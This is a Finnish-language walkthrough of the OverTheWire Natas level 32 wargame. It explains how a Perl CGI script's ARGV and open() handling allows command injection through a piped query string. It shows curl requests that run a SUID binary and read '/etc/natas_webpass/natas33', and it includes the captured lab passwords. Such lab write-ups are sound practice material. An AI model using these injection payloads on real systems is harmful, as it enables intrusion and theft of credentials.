Tässä koskien tätä polku hakemistoa **(./getpassword)** - miksi suoritettiin näin: `./getpassword%20|` vs `./getpassword`
- %20 tarkoittaa välilyöntiä (spaec) URL muodossa ja se on URL enkoodattu siksi menee näin ja mukaan jos shellissä menisi näin `./getpassword |`
- Putki osalta tarkoittaa komennon ulostulon eteenpäin - ja todennäköisesti CGI skriptin kautta näkyviin.
- Putki on tärkeä osa, koska Unix-shellissä ja se ohjaa vasemman puolen komennon ulostulon oikean puolen syötteeksi.

Entä jos `./getpassword` ja ilman %`20|` ei toimi näkyvästi?
- silloin skripti saattaa tuoda mahdollisesti suorittaa binääri muodossa
- tulos ei ohjaudu näkyviin, vaan menee prosessiin tai jää hukkaan
- binääri **saattaa tulostaa binääristä dataa**, mikä voi aiheuttaa terminaaliin syntax error virhe ilmoituksena näin `Warning: Binary output can mess up your terminal...` ja curl varoittaa, että tulos ei ole tavallista tekstiä.
- Nyt tässä tulostuu se virallinen vastaus.

```
┌──(kali㉿kali)-[~]
└─$ curl -u natas32:NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B "http://natas32.natas.labs.overthewire.org/index.pl?./getpassword%20|" -F "file=ARGV" -F "file=@/home/kali/Downloads/Book1.csv;type=text/csv"
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
<head>
<!-- This stuff in the header has nothing to do with the level -->
<!-- Bootstrap -->
<link href="bootstrap-3.3.6-dist/css/bootstrap.min.css" rel="stylesheet">
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas32", "pass": "<censored>" };</script>
<script src="sorttable.js"></script>
</head>
<script src="bootstrap-3.3.6-dist/js/bootstrap.min.js"></script>

<!-- 
    morla/10111 
    shouts to Netanel Rubin    
-->

<style>
#content {
    width: 900px;
}
.btn-file {
    position: relative;
    overflow: hidden;
}
.btn-file input[type=file] {
    position: absolute;
    top: 0;
    right: 0;
    min-width: 100%;
    min-height: 100%;
    font-size: 100px;
    text-align: right;
    filter: alpha(opacity=0);
    opacity: 0;
    outline: none;
    background: white;
    cursor: inherit;
    display: block;
}

</style>


<h1>natas32</h1>
<div id="content">
<table class="sortable table table-hover table-striped"><tr><th>2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ
</th></tr></table><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

tämä on muu pohja testaus, mutta testattu ja ei pelittänyt, että fail ja hyvä testata ja harjoitus komento.

```
┌──(kali㉿kali)-[~]
└─$ curl -X POST "http://natas32.natas.labs.overthewire.org/index.pl?cat%20%2Fetc%2Fnatas_webpass%2Fnatas33%20%7C" \
  -u natas32:NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B \
  -F 'file=ARGV' \
  -F 'file=@/home/kali/Downloads/Book1.csv;type=text/csv' \
  -F 'submit=Upload'
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
<head>
<!-- This stuff in the header has nothing to do with the level -->
<!-- Bootstrap -->
<link href="bootstrap-3.3.6-dist/css/bootstrap.min.css" rel="stylesheet">
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas32", "pass": "<censored>" };</script>
<script src="sorttable.js"></script>
</head>
<script src="bootstrap-3.3.6-dist/js/bootstrap.min.js"></script>

<!-- 
    morla/10111 
    shouts to Netanel Rubin    
-->

<style>
#content {
    width: 900px;
}
.btn-file {
    position: relative;
    overflow: hidden;
}
.btn-file input[type=file] {
    position: absolute;
    top: 0;
    right: 0;
    min-width: 100%;
    min-height: 100%;
    font-size: 100px;
    text-align: right;
    filter: alpha(opacity=0);
    opacity: 0;
    outline: none;
    background: white;
    cursor: inherit;
    display: block;
}

</style>


<h1>natas32</h1>
<div id="content">
<table class="sortable table table-hover table-striped"></table><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

---

## Burp suite version

Toinen metodi, mutta tästäkin ohje löytyy muilta sivustoilta, bloggi tarinasta ja jopa videostakin. Tämä on myös hyvä testa ja keinoa varmasti löytyy ettei vain `curl` komento.

![alt text](./kuvat-level29-34/natas32-3.png)

![alt text](./kuvat-level29-34/natas32-4.png)

![alt text](./kuvat-level29-34/natas32-5.png)

![alt text](./kuvat-level29-34/natas32-6.png)

![alt text](./kuvat-level29-34/natas32-7.png)

![alt text](./kuvat-level29-34/natas32-8.png)

![alt text](./kuvat-level29-34/natas32-9.png)

![alt text](./kuvat-level29-34/natas32-10.png)

![alt text](./kuvat-level29-34/natas32-11.png)

---

## miniyhteenveto - 1

Tässä natas32:ssa on sama idea kuin natas31-tasossa, mutta tässä on vähän paranneltu versio.

Mikä idea tässä oli?
Käytetään samaa Excel-taulukkoa – sisältö voi olla mitä tahansa, esim. pari satunnaista riviä, tekstiä tai kirjainta. Syötetään `curl`-komentoa, jolla testataan natas32:n URL:ia ja lähetetään se taulukko mukaan. URL:iin oletuksena tulee polku: `http://natas32.natas.labs.overthewire.org/index.pl?` - Tähän perään käytetään Linux-tyyppistä komentoa kuten `ls`, jotta nähdään hakemiston sisältö.


Tulostettuna näkyy hakemisto, ja sieltä löytyy tiedosto `getpassword`, jolla on `SUID`-bit (rws), eli se voidaan suorittaa root-oikeuksin. Tämän kautta haetaan **natas33-tason salasana**, joka sijaitsee binäärin kautta luettavassa tiedostossa.

Siksi tullaan syöttää tällainen URL parametrin injektio hyökkäys `http://natas32.natas.labs.overthewire.org/index.pl?./getpassword%20|` + ja mukaan excel taulukko filu ja näin ollen saadaan se salasanansa.


```
<table class="sortable table table-hover table-striped"><tr><th>.:
</th></tr><tr><td>total 156
</td></tr><tr><td>drwxr-x--- 5 natas32 natas32  4096 Aug 15 13:06 bootstrap-3.3.6-dist
</td></tr><tr><td>-rwsrwx--- 1 root    natas32 16096 Aug 15 13:06 getpassword
</td></tr><tr><td>-rw-r--r-- 1 root    root     9740 Aug 15 13:06 index-source.html
</td></tr><tr><td>-r-xr-x--- 1 natas32 natas32  2968 Aug 15 13:06 index.pl
</td></tr><tr><td>-r-xr-x--- 1 natas32 natas32 97180 Aug 15 13:06 jquery-1.12.3.min.js
</td></tr><tr><td>-r-xr-x--- 1 natas32 natas32 16877 Aug 15 13:06 sorttable.js
</td></tr><tr><td>drwxr-x--- 2 natas32 natas32  4096 Sep 14 13:03 tmp
</td></tr></table><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>

```

## miniyhteenveto - 2

Koskien tätä natas32 tehtävää ja harjoitusta. Tässä natas32 tapahtuu periaatteessa sama ideana kuin natas31:ssä, mutta vain curl komennolla ja/tai käyttää kali linux **burp suite** ohjelma/työkalulla ja käyttäen sitä POST URL:in parametri menetelmää ja mukaan lukien **ARGV** kontekstiin, jota käytetään Perl-ohjelmissa komentoriviparametrien välittämiseen.


Taustalla oleva Perl-skripti käyttää `open()`-funktiota lukemaan tiedostoja, mutta se lukee @ARGV-listan kautta eli komentorivillä annetuista parametreista.

- Tätä voidaan kuin "huijata" järjestelmää syöttämällä oman "tiedostolistamme" ARGV:n kautta – eli käytännössä lähettämällä POST-pyynnössä ylimääräisen tiedoston uusiksi.

**Burp suite** ohjelman alla tai curl koemnnolla lähetettään POST-pyyntöä osoitteeseen url perässä kuin `/index.pl` URL loppuun lisäämällä parametrin ja tämä on esim.

```
/index.pl?ls%20.|
```

Tämä toimii vain jos koko syöte osuu siihen `open()`-kutsuun, eli ensimmäinen tiedosto käytännössä kertoo mitä komentoa suoritetaan.

Muuta poikkeamia mietittykin mm.
- jos testaisi normaalisti URL sivuston kautta niin se ei pelittäisi koska tarvittaan virallinen excel taulukko ja suorittaa POST pyyntö samanaikaisesti.
- Entä jos F12 kautta developer tool työkalujen kautta suorittaa POST pyynnön, jossa lähetäisi tiedoston eli excel talukonsa? 
   - vastaus: ei, ei kunnolla koska tämä tapahtuisi uusi **multipart/form-data** POST-pyynnöllä ja jossa kuuluu tiedostoliite eli excel taulukko tiedosto.
   - F12:sta voi vain katsoa ja toistaa jo tehtyjä pyyntöjä, mutta ei luoda uusia "liitä tämä tiedosto mukaan" -tyylisiä pyyntöjä.


## linkejä ja apua ja teorioita

https://www.youtube.com/watch?v=KirvNW1FlNo


https://anyafachri.medium.com/perl-ultimate-vulnerability-in-cgi-opening-pipes-part-ii-natas32-overthewire-write-up-b3cdf6efe220


https://miaxu-src.github.io/natas/2021/09/19/natas32-walkthrough.html












































